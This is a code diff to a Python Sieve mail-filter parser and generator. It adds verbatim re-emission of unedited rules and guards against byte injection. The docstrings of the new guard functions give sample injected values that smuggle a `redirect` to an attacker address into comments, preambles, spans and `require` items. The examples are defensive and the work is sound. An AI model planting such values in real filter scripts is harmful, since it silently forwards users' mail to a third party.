@@ -13,7 +13,7 @@ Design principles:
 import bisect
 import re
 import threading
-from dataclasses import dataclass, field
+from dataclasses import dataclass, field, replace
 
 from sievelib.parser import Lexer, Parser
 from sievelib.parser import ParseError as SieveLibParseError
@@ -51,7 +51,11 @@ class Rule:
     cannot persist an id, so any the server minted would be a fresh value on every
     parse. Clients mint their own render keys and strip them at the wire. Dropping
     the id also makes Rule comparable by value, which is what lets tests assert
-    exact round-trip fidelity rather than mere stability.
+    exact round-trip fidelity rather than mere stability. `source` joins that
+    value equality while being content-of-origin rather than meaning, so a
+    comparison asking whether two Rules DO the same thing must clear it first —
+    two Rules identical in every effect differ here whenever they were written
+    down differently.
     """
 
     name: str = ""
@@ -59,6 +63,14 @@ class Rule:
     match: str = "anyof"  # one of MATCH_OPERATORS, or "" for a bare `if <test> {`
     conditions: list[Condition] = field(default_factory=list)
     actions: list[Action] = field(default_factory=list)
+    source: str = ""
+    """The exact bytes this Rule was parsed from, including its leading gap.
+
+    Empty for a Rule the builder minted: it was never parsed from anything, so
+    there is nothing to re-emit and it regenerates. This is CONTENT, not
+    identity (docs/adr/0001-identity-is-view-state.md) — two identical Rules
+    legitimately carry identical spans, and nothing here distinguishes them.
+    """
 
 
 @dataclass
@@ -67,6 +79,12 @@ class RawBlock:
 
     text: str
     comment: str = ""
+    source: str = ""
+    """The exact bytes this block was parsed from, including its leading gap.
+
+    Same field, same rules and same reasons as `Rule.source` — a RawBlock is an
+    Entry too, and the decomposition covers every entry or it covers none.
+    """
 
 
 Entry = Rule | RawBlock
@@ -84,6 +102,20 @@ class SieveScript:
 
     requires: list[str] = field(default_factory=list)
     entries: list[Entry] = field(default_factory=list)
+    preamble: str = ""
+    """Bytes before the first `require`. Immovable: reordering Rules never
+    moves the file's header.
+
+    Empty when the file has no `require`, and deliberately so — those leading
+    bytes go into the FIRST ENTRY'S span instead. A comment at the top of a
+    file with no `require` is a rule's `# --- name ---` far more often than it
+    is a file header, and a span that carries its own name is what lets a
+    reordered Rule take that name with it."""
+    requires_source: str = ""
+    """The exact bytes of the `require` statement(s), which may be several and
+    may span lines. Re-emitted verbatim only when nothing in the file changed."""
+    tail: str = ""
+    """Bytes after the last entry's span. Blank lines and trailing comments."""
 
     @property
     def rules(self) -> list[Rule]:
@@ -403,6 +435,51 @@ class SieveParser:
         self.line_idx = 0
         self.depth = depth
         self.lex = _LexicalMap(text)
+        # First line not yet claimed by the preamble, the requires or an
+        # entry's span. Moves ONLY on a successful consumption, in `_append`
+        # and `_record_requires`; the backtracking helpers reset `line_idx`
+        # without touching it, which is what leaves a refused attempt's bytes
+        # available to whichever entry eventually claims them.
+        self._span_start = 0
+
+    def _span(self, start: int, end: int) -> str:
+        """The exact bytes of lines[start:end], separators included.
+
+        `text.split("\\n")` drops the separators, so joining a range back needs
+        a trailing "\\n" for every line EXCEPT one ending at the true end of a
+        file that does not end in a newline. Getting this wrong shifts every
+        subsequent span by one byte and the reassembly invariant catches it.
+        """
+        if start >= end:
+            return ""
+        chunk = "\n".join(self.lines[start:end])
+        return chunk if end == len(self.lines) else chunk + "\n"
+
+    def _append(self, script: SieveScript, entry: Entry) -> None:
+        """Append an entry and hand it every byte since the last one.
+
+        The leading gap — blank lines, the `# --- name ---` line, any comment
+        above it — is part of the span, so a reordered Rule takes its name with
+        it. There is no separate "filler" category: a byte is either preamble,
+        part of the requires, inside exactly one entry's span, or tail.
+        """
+        entry.source = self._span(self._span_start, self.line_idx)
+        self._span_start = self.line_idx
+        script.entries.append(entry)
+
+    def _record_requires(self, script: SieveScript, statement_start: int) -> None:
+        """Split the region [span_start, line_idx) at the `require` statement.
+
+        Everything before the statement is preamble on the FIRST require and
+        part of `requires_source` on any later one — a comment sitting between
+        two `require` statements belongs with them, not with the rule after.
+        """
+        if not script.requires_source:
+            script.preamble += self._span(self._span_start, statement_start)
+            script.requires_source = self._span(statement_start, self.line_idx)
+        else:
+            script.requires_source += self._span(self._span_start, self.line_idx)
+        self._span_start = self.line_idx
 
     def parse(self) -> SieveScript:
         if not self.lex.usable:
@@ -418,8 +495,14 @@ class SieveParser:
             # tells outcomes apart from the result, never from an exception,
             # because raising here would lock a user out of their own filters
             # over one stray byte.
+            #
+            # `text` is stripped of its trailing newlines and `source` is not:
+            # the span has to be the WHOLE text or the decomposition loses the
+            # bytes `rstrip` took, on exactly the file we understand least.
             body = self.text.rstrip("\n")
-            return SieveScript(entries=[RawBlock(text=body)] if body.strip() else [])
+            if not body.strip():
+                return SieveScript(tail=self.text)
+            return SieveScript(entries=[RawBlock(text=body, source=self.text)])
 
         script = SieveScript()
         pending_comment = ""
@@ -442,23 +525,48 @@ class SieveParser:
                 # since by gen1 both sides had already lost it. RFC 5228 §3.2
                 # shows multiple statements and Horde/Ingo emits them
                 # (areyousievious-8fg.15).
+                statement_start = self.line_idx
                 statement, clean = self._consume_statement()
                 if not clean:
                     # Not a `require` we can read. Keep its bytes rather than
                     # guess at them.
-                    script.entries.append(RawBlock(text=statement, comment=pending_comment))
+                    self._append(script, RawBlock(text=statement, comment=pending_comment))
+                    pending_comment = ""
+                    continue
+                if script.entries:
+                    # A `require` that follows a command. RFC 5228 §3.2 says
+                    # every `require` precedes every other command, so this file
+                    # is already invalid Sieve — which is not a reason to drop
+                    # it. We do not own these files, and a RawBlock is what this
+                    # module does with a construct it cannot place in its model.
+                    #
+                    # It must not go to `requires_source`. That term is
+                    # concatenated AHEAD of every entry, so bytes routed there
+                    # once an entry has already claimed its span come back above
+                    # it, and `preamble + requires_source + Σ source + tail`
+                    # stops reproducing the file — the same bytes, in the wrong
+                    # order, which the reassembly invariant is stated to forbid.
+                    #
+                    # Its extensions are deliberately NOT harvested. Harvesting
+                    # them would make a later regenerating save emit a canonical
+                    # `require [...]` at the top AND re-emit this block, so the
+                    # file would declare the same extension twice. Left
+                    # unharvested the declaration survives exactly once, in the
+                    # verbatim bytes that already carry it.
+                    self._append(script, RawBlock(text=statement, comment=pending_comment))
                     pending_comment = ""
                     continue
                 for extension in self._parse_require(statement):
                     if extension not in script.requires:
                         script.requires.append(extension)
+                self._record_requires(script, statement_start)
                 continue
 
             # Disabled rule (commented out with ## prefix) — check before comment handler
             if line.startswith("## ") and self.line_idx >= failed_run_end:
                 disabled_rule = self._try_parse_disabled_block(pending_comment)
                 if disabled_rule:
-                    script.entries.append(disabled_rule)
+                    self._append(script, disabled_rule)
                     pending_comment = ""
                     continue
                 # Not a disabled rule. Do not try again at every line of the
@@ -485,11 +593,11 @@ class SieveParser:
                 rule = self._try_parse_rule(pending_comment)
                 if rule:
                     self._auto_name_rule(rule)
-                    script.entries.append(rule)
+                    self._append(script, rule)
                 else:
                     # Couldn't parse - store as raw block
                     raw_text = self._consume_block()
-                    script.entries.append(RawBlock(text=raw_text, comment=pending_comment))
+                    self._append(script, RawBlock(text=raw_text, comment=pending_comment))
                 pending_comment = ""
                 continue
 
@@ -501,9 +609,12 @@ class SieveParser:
             # oracle (areyousievious-8fg.13): the message text a user would
             # receive was not the message text they wrote.
             raw_text = self._consume_raw_statement()
-            script.entries.append(RawBlock(text=raw_text, comment=pending_comment))
+            self._append(script, RawBlock(text=raw_text, comment=pending_comment))
             pending_comment = ""
 
+        # Whatever is left is the tail: blank lines and trailing comments that
+        # no entry claimed.
+        script.tail = self._span(self._span_start, len(self.lines))
         return script
 
     @staticmethod
@@ -983,27 +1094,106 @@ class SieveGenerator:
     """Generate Sieve script text from a SieveScript."""
 
     def generate(self, script: SieveScript) -> str:
-        parts = []
+        """The script's bytes: verbatim where nothing changed, canonical where it did.
 
-        # Require statement
-        requires = self._compute_requires(script)
-        if requires:
-            req_list = ", ".join(f'"{r}"' for r in requires)
-            parts.append(f"require [{req_list}];")
-            parts.append("")
+        Two paths per entry and no third. A span that `span_is_faithful`
+        vouches for goes out byte for byte — including the blank lines and the
+        `# --- name ---` above it, which is what lets a reordered Rule take its
+        name with it. Everything else is rendered in house style.
 
-        # Generate in order — position in `entries` IS the order
-        for entry in script.entries:
-            if isinstance(entry, Rule):
-                parts.append(self.generate_entry(entry))
-                parts.append("")
-            else:
-                if entry.comment:
-                    parts.append(f"# {entry.comment}")
-                parts.append(entry.text)
-                parts.append("")
+        The old implementation built a list of `parts` and joined it with
+        newlines, which imposed our own blank-line convention on every entry in
+        the file. That convention is exactly what we are no longer entitled to
+        impose on entries we were not asked to change.
+        """
+        verbatim = [span_is_faithful(e) for e in script.entries]
+        regenerated = not all(verbatim)
+        head = script.preamble + self._requires_text(script, regenerated=regenerated)
 
-        return "\n".join(parts).rstrip() + "\n"
+        if not regenerated and head == script.preamble + script.requires_source:
+            # NOTHING CHANGED, so nothing is post-processed — not the blank
+            # lines, not the trailing newline count, nothing. Every rule this
+            # generator could apply here would be it reformatting a file it was
+            # not asked to touch, which is the whole behaviour being removed.
+            # This early return is what makes the byte-identical property exact
+            # rather than nearly true.
+            return (head + "".join(e.source for e in script.entries) + script.tail) or "\n"
+
+        out = head
+        for entry, is_verbatim in zip(script.entries, verbatim, strict=True):
+            piece = entry.source if is_verbatim else self._canonical_span(entry)
+            out = self._join(out, piece, seam=not is_verbatim)
+
+        if verbatim and not verbatim[-1]:
+            # The last entry regenerated, so its separation from the tail is
+            # ours to settle. The tail itself is still appended as it stands.
+            #
+            # This is a no-op for every entry the PARSER can produce:
+            # `_canonical_span` returns `body.strip("\n") + "\n"`, so `out`
+            # already ends in exactly one newline. It is live for one entry the
+            # WIRE can produce — `RawBlockDTO.text` defaults to `""`, so
+            # `{"kind": "raw"}` is a valid entry whose canonical span is a bare
+            # "\n", `_join` strips that to nothing and leaves the seam's blank
+            # line dangling at the end of the file. Without this line that save
+            # ends "\n\n". Pinned by
+            # test_verbatim_reemission.py::test_an_empty_raw_block_last_does_not_leave_a_dangling_blank_line.
+            out = out.rstrip("\n") + "\n"
+        return (out + script.tail) or "\n"
+
+    @staticmethod
+    def _join(out: str, piece: str, seam: bool) -> str:
+        """Append `piece`, settling blank lines ONLY at a seam a regeneration made.
+
+        This never reflows the document. A verbatim span's interior — and the
+        gap between two verbatim spans — is exactly what the user wrote,
+        including two blank lines between rules if that is what they wrote, and
+        including the blank lines inside a multi-line `vacation` message. An
+        earlier draft of this ran `re.sub(r"\\n{3,}", "\\n\\n", ...)` over the
+        whole output, which corrupts both: it is the same shape as the bug
+        `.13` fixed, where a blank line was injected into a vacation message
+        and changed the text a sender received.
+
+        The only place this generator is entitled to impose a convention is
+        where a regenerated span meets its neighbour, because a regenerated
+        span has no gap of its own and something has to separate it.
+        """
+        if not seam:
+            return out + piece
+        if not out:
+            return piece.lstrip("\n")
+        return out.rstrip("\n") + "\n\n" + piece.lstrip("\n")
+
+    def _canonical_span(self, entry: Entry) -> str:
+        """One regenerated entry's bytes. Separation is `_join`'s problem."""
+        if isinstance(entry, Rule):
+            body = self.generate_entry(entry)
+        else:
+            body = f"# {entry.comment}\n{entry.text}" if entry.comment else entry.text
+        return body.strip("\n") + "\n"
+
+    def _requires_text(self, script: SieveScript, regenerated: bool) -> str:
+        """The `require` statement(s), verbatim when the file was not rewritten.
+
+        Pruning (areyousievious-8fg.15) is a property of REGENERATION. An
+        untouched file that over-declares `reject` keeps saying so, because
+        rewriting that line would break the byte-identical property for a file
+        nobody edited. Once anything regenerates, the computed set governs and
+        the extension that no longer has a user is dropped.
+
+        Do NOT additionally gate this on `self._compute_requires(script) ==
+        script.requires`: pruning makes those two differ for exactly the
+        over-declared script this branch exists to leave alone, so that gate
+        would send every such file down the canonical path and defeat itself.
+        That the bytes agree with the declared list is `_boundary_error`'s job
+        (Task 7), and it holds by construction for a freshly parsed script.
+        """
+        if script.requires_source and not regenerated:
+            return script.requires_source
+        computed = self._compute_requires(script)
+        if not computed:
+            return ""
+        req_list = ", ".join(f'"{self._quote(r)}"' for r in computed)
+        return f"require [{req_list}];\n"
 
     def generate_entry(self, rule: Rule) -> str:
         """The exact bytes one Rule contributes to a script.
@@ -1186,6 +1376,7 @@ def _rule_to_json(r: Rule) -> dict:
             for c in r.conditions
         ],
         "actions": [{"type": a.action_type, "argument": a.argument} for a in r.actions],
+        "source": r.source,
     }
 
 
@@ -1198,10 +1389,13 @@ def script_to_json(script: SieveScript) -> dict:
     """
     return {
         "requires": script.requires,
+        "preamble": script.preamble,
+        "requires_source": script.requires_source,
+        "tail": script.tail,
         "entries": [
             _rule_to_json(e)
             if isinstance(e, Rule)
-            else {"kind": "raw", "text": e.text, "comment": e.comment}
+            else {"kind": "raw", "text": e.text, "comment": e.comment, "source": e.source}
             for e in script.entries
         ],
     }
@@ -1234,6 +1428,7 @@ def _rule_from_json(r: dict) -> Rule:
         match=r.get("match", "anyof"),
         conditions=conditions,
         actions=actions,
+        source=r.get("source", ""),
     )
 
 
@@ -1245,13 +1440,24 @@ def json_to_script(data: dict) -> SieveScript:
     The previous representation could, and silently dropped the omitted rule on
     save.
     """
-    script = SieveScript(requires=data.get("requires", []))
+    script = SieveScript(
+        requires=data.get("requires", []),
+        preamble=data.get("preamble", ""),
+        requires_source=data.get("requires_source", ""),
+        tail=data.get("tail", ""),
+    )
 
     for e in data.get("entries", []):
         if not isinstance(e, dict):
             continue
         if e.get("kind") == "raw":
-            script.entries.append(RawBlock(text=e.get("text", ""), comment=e.get("comment", "")))
+            script.entries.append(
+                RawBlock(
+                    text=e.get("text", ""),
+                    comment=e.get("comment", ""),
+                    source=e.get("source", ""),
+                )
+            )
         elif e.get("kind") == "rule":
             script.entries.append(_rule_from_json(e))
 
@@ -1306,22 +1512,331 @@ def sieve_is_parseable(text: str) -> str | None:
         return str(parser.error)
 
 
+def _without_span(entry: Entry) -> Entry:
+    """A copy with `source` cleared, for comparison by value alone."""
+    return replace(entry, source="")
+
+
+def span_is_faithful(entry: Entry) -> bool:
+    """True when `entry.source` re-parses to exactly this entry and nothing else.
+
+    This is the whole of the dirty check. The span is the pristine copy the
+    entry was parsed from, so comparing against it needs no flag, no identity
+    and no cooperation from the client — which matters, because `source`
+    crosses the wire and comes back under the client's control.
+
+    Four things are required, and all four are load-bearing:
+
+      - EXACTLY ONE entry, so a span cannot carry a second statement. Append
+        `redirect "attacker@example.com";` to an otherwise honest span and this
+        is what refuses it.
+      - NO requires, so a span cannot declare an extension the file does not.
+      - NO preamble and NO tail, so a span cannot carry loose bytes on either
+        side of the entry it claims to be.
+      - VALUE EQUALITY ignoring `source` itself, so the bytes mean what the
+        entry says they mean.
+
+    It fails CLOSED. Every path that cannot vouch for the span returns False
+    and the caller regenerates, which is correct but reformats — the failure
+    mode is a cosmetic loss, never a wrong filter.
+
+    THE LEADING/TRAILING ASYMMETRY IS DELIBERATE. A span may carry comment and
+    blank lines ABOVE the entry beyond the one absorbed as its name, and may not
+    carry so much as a blank line BELOW it. That is not an oversight to be
+    tidied up: the leading gap is part of the span on purpose, because that is
+    what makes a reordered Rule take its `# --- name ---` — and any comment the
+    user wrote above it — along to its new position. Re-parsing a span with a
+    leading gap yields one entry and no preamble, precisely because the parser
+    puts that gap inside the entry. A TRAILING gap is different in kind: bytes
+    after an entry belong to whatever comes next, or to the file's tail, so a
+    span claiming them re-parses with a non-empty tail and is refused. Making
+    the two sides symmetrical breaks reordering, which is a core requirement.
+
+    The `not entry.source` line below is a REDUNDANT fast path, kept for
+    clarity. An empty span parses to zero entries, so `len(...) != 1` already
+    refuses it — deleting the line changes no result. It is marked so the next
+    reader does not spend time working out which case it uniquely catches.
+    """
+    if not entry.source:
+        return False
+    reparsed = parse_sieve(entry.source)
+    if reparsed.requires or reparsed.preamble or reparsed.tail:
+        return False
+    if len(reparsed.entries) != 1:
+        return False
+    return _without_span(reparsed.entries[0]) == _without_span(entry)
+
+
+_LONE_CR = re.compile(r"\r(?!\n)")
+_EXTENSION_NAME = re.compile(r"[A-Za-z0-9][A-Za-z0-9._;/-]*")
+
+
+def _unwritable_byte_error(script: SieveScript) -> str | None:
+    """Whether any text we would write carries a byte that is not ours to write.
+
+    One question — are these bytes ours to write — asked of every field that
+    becomes part of the script outside a quoted string. Values and arguments are
+    excluded because the generator escapes them into quoted strings, verified; a
+    byte there is a literal, not a statement.
+
+    THAT EXCLUSION ANSWERS STATEMENT INJECTION AND NOTHING ELSE, which is worth
+    saying plainly before the NUL clause below leans on a harm quoting does not
+    address. Escaping stops a byte from becoming a statement of its own; it does
+    not stop the byte from reaching the mail server. A Condition value holding a
+    NUL, and an Action argument holding one, both pass `preflight_error`, and
+    the generated `header :contains` and `fileinto` lines carry that byte raw
+    between the quotes — a lone CR in a value likewise. So each rule below is a
+    NARROWING of where such a byte may appear, never a seal: a server that
+    truncates its input at a NUL still has one to truncate at. That is accepted
+    rather than overlooked. No version of this app has ever checked a value for
+    these bytes — `_unwritable_byte_error` is new on this branch, and main had
+    no byte guard at all — so the gap is not a regression, and closing it is a
+    decision about what a value may contain, which is a different question from
+    which bytes are ours to write.
+
+    THE SCOPE DIFFERS PER BYTE, and each difference is the line between a guard
+    and a lockout:
+
+    A BARE LF, in `Rule.name` or `RawBlock.comment` ONLY. Those two are
+    interpolated into a single `# ` line — `f"# {comment}\n{text}"` and
+    `f"# --- {name} ---"` — so a newline in them ends the comment and everything
+    after it is a live statement. `RawBlock(comment='c\nredirect "a@b.com";')`
+    rendered as `# c\nredirect "a@b.com";\nkeep;` and was answered 200. This
+    needs no reading of the RFC, unlike the CR below: a bare LF ends a line for
+    every parser there is. It must NOT be asked of `text`, `source`, `preamble`,
+    `requires_source` or `tail`, all of which are many lines by definition.
+
+    A LONE CR, in every field. We split lines on "\n" alone, so a bare CR is an
+    ordinary mid-line character and `# note\rredirect "a@b.com";` is ONE comment
+    to our parser, to sievelib, and therefore to the `.13` pre-flight too. RFC
+    5228 ends a comment at CRLF and excludes CR from its body, so what a server
+    does with the octets after it is undefined and one plausible reading runs
+    them. CRLF stays legal because every CR in it is followed by LF.
+
+    A NUL, in everything EXCEPT a `RawBlock`'s own `text` and `source`. RFC
+    5228's `octet-not-crlf` excludes %x00, so a NUL is never valid Sieve, and
+    against a C-implemented server truncation at it is the classic desync.
+
+    The exemption is meant for the file that ALREADY holds one — a NUL that
+    breaks lexing takes the whole file down the `usable == False` path and comes
+    back as a single RawBlock carrying the entire text — but WHAT THE CODE
+    ACTUALLY KEYS ON is narrower than that sentence and worth stating plainly: a
+    NUL anywhere in `RawBlock.text` exempts that entry's whole `source`. Both
+    sides of that test are bytes the client supplies, so it is usable on purpose:
+    put a NUL in `text` and one in the leading gap rides along. No capability is
+    gained, because the NUL in `text` is itself the unrestricted channel —
+    `RawBlock.text` grants arbitrary statements by design and by ADR 0002 — so a
+    tighter test would buy nothing while risking the lockout it exists to avoid.
+    Refusing it would lock a user out of saving their own file over a byte
+    already sitting on their server, and re-emitting bytes that are already there
+    changes nothing.
+
+    SO THE EXEMPTION REACHES ONLY AS FAR AS THAT REASON DOES: a `source` is
+    exempt when the NUL is in the block's own `text`, and not otherwise. Two
+    earlier scopings were wider than their own rationale, both for one structural
+    reason — bytes an entry was parsed from that land in NO COMPARED FIELD, and
+    therefore need only survive `span_is_faithful`, which cannot see them:
+
+      - A RULE'S `source`. An earlier version of this comment claimed the lockout
+        case put the NUL in `text` and `source` and nowhere else; that is true
+        only of a NUL that BREAKS LEXING.
+        `parse_sieve('# note\x00here\n# --- n ---\nif ...')` lexes fine and gives
+        a RULE whose `source` carries the NUL, and exempting it there wrote
+        `# lead\x00redirect "attacker@example.com";` to the mail server, 200 and
+        byte-identical.
+      - A RAWBLOCK'S LEADING GAP. The parser keeps only the LAST comment line as
+        `comment`; earlier lines, and blank lines, stay in `source` alone. So
+        `'# a\x00redirect "atk@e.com";\n# b\nvacation :days 7 "Away";\n'` has
+        `comment == 'b'`, a clean `text`, and the NUL in neither — the
+        single-comment shape was refused and this one was not.
+
+    Marginal capability over `RawBlock.text` is nil either way, since that field
+    already grants arbitrary statements deliberately. The reason to refuse it is
+    that these bytes sit in no modelled field at all, so they survive parse →
+    display → save invisibly, and an exemption wider than the reason given for it
+    is one nobody can check.
+
+    THE RESIDUAL COST, named rather than left to be discovered: a NUL ANYWHERE in
+    a Rule's span is now refused — not only in a comment above it, but inside a
+    quoted value (`"sp\x00am"`) and in a trailing in-body comment, both of which
+    lex, are faithful, and are refused. Same for a RawBlock's leading gap. That is
+    the cost already accepted for a lone CR, which is refused in `source`
+    unconditionally; accepting it for one byte and not the other was two opposite
+    principles applied to one shape.
+
+    A REQUIRE ITEM must look like an extension name, which is a whitelist rather
+    than a byte list because nothing else here can be: `_requires_text`
+    interpolates each item into `require ["..."];`, and `script.requires` is the
+    one client-supplied string the design never thought to check — it is what
+    `_boundary_error` checks the head bytes AGAINST, so it was read as the
+    trusted reference rather than as input. Unescaped, and with no entries in the
+    script at all, `requires=['fileinto"];\nredirect "atk@e.com";\n#']` rendered
+    a live `redirect` that sievelib pronounced valid Sieve. That is the original
+    Task 7 bug — hostile bytes, no entries, 200 — one field along.
+
+    `[A-Za-z0-9][A-Za-z0-9._;/-]*` matched in FULL is a shape, not a list of
+    names, so an extension nobody here has heard of still saves; all 15 declared
+    across the 63 corpus fixtures match it, `vacation-seconds` and `imap4flags`
+    included. It subsumes the byte checks for this one field, since CR, LF and
+    NUL are all outside the class. The interpolation is escaped as well, because
+    every other string this generator writes is, and a guard that happens to sit
+    upstream is not a reason to emit text unescaped.
+
+    `;` AND `/` ARE IN THE CLASS BECAUSE COLLATION NAMES CARRY THEM, and leaving
+    them out was this guard's own turn at being `.13`. RFC 5228 §2.7.3 mandates
+    `comparator-<name>` for any collation outside `i;octet` and
+    `i;ascii-casemap`, and every RFC 4790 collation name has a `;` in it — so
+    `comparator-i;ascii-numeric` was refused, which meant a user with an ordinary
+    relational spam-score rule could open their script and never save it again.
+    `_compute_requires` WRITES THAT NAME ITSELF, so the pre-flight was rejecting
+    our own generator's output. No corpus fixture uses a relational test, which
+    is exactly why all 63 stayed green: the corpus is the oracle only for shapes
+    it contains. Neither character can break out of a quoted string, so this
+    costs nothing — and the escaping at `_requires_text` is what would hold if it
+    did.
+
+    NOT CHECKED, DELIBERATELY: \x0b, \x0c, \x85, U+2028 and U+2029 all reach the
+    output and all are legal comment octets under RFC 5228, which ends a comment
+    at CRLF and at nothing else. Python's `str.splitlines()` breaks on every one
+    of them, which is why a fuzz oracle built on it reports them and why this
+    one is built on CRLF/LF/CR instead. Refusing them would be superstition.
+    """
+    one_comment_line: list[str] = []
+    written_verbatim: list[str] = [script.preamble, script.requires_source, script.tail]
+    no_nul: list[str] = [script.preamble, script.requires_source, script.tail]
+    for entry in script.entries:
+        written_verbatim.append(entry.source)
+        if isinstance(entry, Rule):
+            one_comment_line.append(entry.name)
+            no_nul.append(entry.source)
+        else:
+            one_comment_line.append(entry.comment)
+            written_verbatim.append(entry.text)
+            if "\x00" not in entry.text:
+                # The NUL is not in the bytes the exemption is for, so whatever
+                # else the span holds is not covered by it.
+                no_nul.append(entry.source)
+
+    for extension in script.requires:
+        # `fullmatch`, not `match`: Python's `$` also matches BEFORE a trailing
+        # newline, so `"elsif\n"` satisfied an anchored pattern and rendered
+        # `require ["elsif` and `"];` on two lines. Caught by the fuzzer the
+        # first time it could see this field at all.
+        if not _EXTENSION_NAME.fullmatch(extension):
+            return f"not an extension name: {extension!r}"
+    for text in one_comment_line:
+        if "\n" in text:
+            return "a line break in a name or comment would end the comment it sits in"
+    for text in (*one_comment_line, *written_verbatim):
+        if _LONE_CR.search(text):
+            return "a carriage return would end a line for the server but not for us"
+    for text in (*one_comment_line, *no_nul):
+        if "\x00" in text:
+            return "a NUL would truncate the script for the server"
+    return None
+
+
+def _boundary_error(script: SieveScript) -> str | None:
+    """What is wrong with the verbatim bytes that are not an entry's span.
+
+    `span_is_faithful` proves an entry's span by re-parsing it and comparing to
+    the entry. The preamble, the `require` bytes and the tail have no entry to
+    be compared against, so they are held to a narrower rule instead: the head
+    may hold comments, blank lines and `require` statements for extensions the
+    wire declares, and NOTHING else; the tail may hold no statement at all.
+    Without this, `source` on the wire would be an arbitrary-text-to-the-mail-
+    server hole with no guard on either end — and not a theoretical one. Before
+    this guard, a PUT carrying `preamble = 'redirect "attacker@example.com";'`
+    and no entries at all was answered 200 and written to the user's mail
+    server.
+
+    THE PREAMBLE IS CHECKED TWICE, ALONE AND THEN WITH THE `require` BYTES
+    JOINED ON, because the generator emits it in both companies. A save that
+    regenerates anything drops `requires_source` and writes the preamble against
+    a freshly rendered `require` line instead, so checking only the join
+    validates bytes that are not the bytes written: a `preamble` of
+    `require ["fileinto"` with a `requires_source` of `];` reads as one honest
+    statement joined, and on the regenerating path goes out as
+    `require ["fileinto"require ["fileinto"];`. Found by attacking this guard
+    after writing it. A real server refuses that, so the cost was a confusing
+    failure rather than a wrong filter — but a check that does not cover what is
+    actually emitted is not a check.
+
+    The join is needed as well as the halves, and is parsed as ONE unit, because
+    `requires_source` is not always a single well-formed statement: a file that
+    declares its extensions in three goes keeps the comment sitting between them
+    in the same span.
+
+    THE REQUIRES CHECK IS SUBSET, NOT EQUALITY, and that difference is the whole
+    difference between a guard and a lockout. The property worth having is that
+    the verbatim bytes never DECLARE MORE than the wire says — a client must not
+    send `requires: ["fileinto"]` and write `require ["fileinto", "vacation"];`.
+    The converse costs nothing and is the ordinary case: a script built in the
+    UI declares `["fileinto"]` and carries no `requires_source` at all, because
+    there were never any bytes to parse and the generator renders that line
+    canonically. Demanding equality refuses every such save — it refused nine
+    existing tests, `test_saving_rules_stores_generated_sieve` among them,
+    before this was corrected. An empty head is therefore always agreement, and
+    so is a script whose `require` sits BELOW its first entry: those extensions
+    are deliberately not harvested, so the list and the bytes are both empty.
+
+    This is deliberately NOT `.13`'s mistake in a new place. That bead learned
+    that a whole-script validator refuses working scripts forever, because
+    sievelib does not know `include`, `addheader` or `spamtest` though every
+    real server does. Two things keep this clear of it: it runs OUR parser, not
+    sievelib's, and it runs over the head and tail ONLY — never over an entry,
+    which is where an unknown extension lives.
+    """
+    for text in (script.preamble, script.preamble + script.requires_source):
+        head = parse_sieve(text)
+        if head.entries:
+            return "preamble carries a statement"
+        undeclared = [r for r in head.requires if r not in script.requires]
+        if undeclared:
+            return f"require bytes declare an undeclared extension: {undeclared[0]}"
+    tail = parse_sieve(script.tail)
+    if tail.entries or tail.requires:
+        return "trailing bytes carry a statement"
+    return None
+
+
 def preflight_error(script: SieveScript) -> str | None:
     """Why the mail server would refuse this script, or None (`.13`).
 
-    ONLY THE SPANS WE REGENERATED are checked, never the RawBlocks, and that
-    scoping is load-bearing rather than an optimisation. sievelib's grammar has
-    real gaps — `include`, `addheader` and `spamtest` are all "unknown command"
-    to it though every real server takes them — so validating the whole script
-    would refuse working scripts forever, for a construct we never touched.
+    ONLY THE RULES are checked, never the RawBlocks, and that scoping is
+    load-bearing rather than an optimisation. sievelib's grammar has real gaps
+    — `include`, `addheader` and `spamtest` are all "unknown command" to it
+    though every real server takes them — so validating the whole script would
+    refuse working scripts forever, for a construct we never touched. A
+    RawBlock is where such a construct lives, and it is exempt.
 
-    Checking only what we generated is sound because a RawBlock is re-emitted
-    byte-identical and the server already accepted it once.
+    NOTE THAT THIS IS NOT THE SAME LINE AS "what we regenerated". The loop
+    below runs over every Rule unconditionally, including one whose span
+    `span_is_faithful` vouched for and which a save will therefore re-emit
+    verbatim rather than regenerate. `generate_sieve` takes the same verbatim
+    path here as it does on the save, so what sievelib sees for such a Rule is
+    that original span itself, under the require line it needs — the check is
+    over the bytes that will actually go out either way.
+
+    Skipping the RawBlocks is sound for a different reason: their bytes are
+    re-emitted byte-identical and the server already accepted them once.
 
     Each Rule is checked as its own little script, with the requires it needs,
     because sievelib treats a command whose extension was not required as a
     hard parse failure.
+
+    SINCE areyousievious-8fg.14 IT ALSO COVERS THE BOUNDARY BYTES. The
+    preamble, the `require` bytes and the tail cross the wire and are written
+    to the mail server verbatim, and no entry exists to compare them against —
+    so `_boundary_error` checks them first, and `_unwritable_byte_error` checks
+    every field that becomes a line of the script for a byte that would end that
+    line for the server and not for us. Both ask a different question from the
+    one below — is this text ours to write at all, rather than will the server
+    compile it — which is why they are separate functions and not more clauses.
     """
+    problem = _unwritable_byte_error(script) or _boundary_error(script)
+    if problem:
+        return problem
     for rule in script.rules:
         problem = sieve_is_parseable(generate_sieve(SieveScript(entries=[rule])))
         if problem:
@@ -1330,11 +1845,25 @@ def preflight_error(script: SieveScript) -> str | None:
 
 
 def generate_rule(rule: Rule) -> str:
-    """The Sieve one Rule contributes to a script, byte for byte.
+    """The house-style Sieve one Rule renders to.
 
-    Goes through the same `SieveGenerator.generate_entry` a save does, so a
-    preview cannot say one thing and a save write another. Note what this does
-    NOT include: the `require [...]` line, which is a property of the whole
-    script rather than of any one Rule.
+    Goes through the same `SieveGenerator.generate_entry` a regenerating save
+    does — one generator, not two. That sharing is the whole point of
+    areyousievious-8fg.17: the SPA used to carry `previewRule`, a second
+    implementation that had already diverged five ways from this one.
+
+    THIS IS NOT ALWAYS THE BYTES A SAVE WRITES, and since
+    areyousievious-8fg.14 it is not meant to be. A save re-emits an UNEDITED
+    Rule's original span verbatim and never reaches this function; only an
+    edited Rule takes the regenerating path. So what a preview shows is the
+    text a Rule would take IF IT WERE EDITED — which is exactly the disclosure
+    it is for, since the reformatting is what the user has not committed to
+    yet. An untouched Rule keeps its own bytes.
+
+    Note what this does NOT include: the `require [...]` line, which is a
+    property of the whole script rather than of any one Rule — nor the trailing
+    newline, which `_canonical_span` appends when a save places this text among
+    its neighbours. Preview shows a Rule on its own, so it has no neighbours and
+    no separator to settle.
     """
     return SieveGenerator().generate_entry(rule)
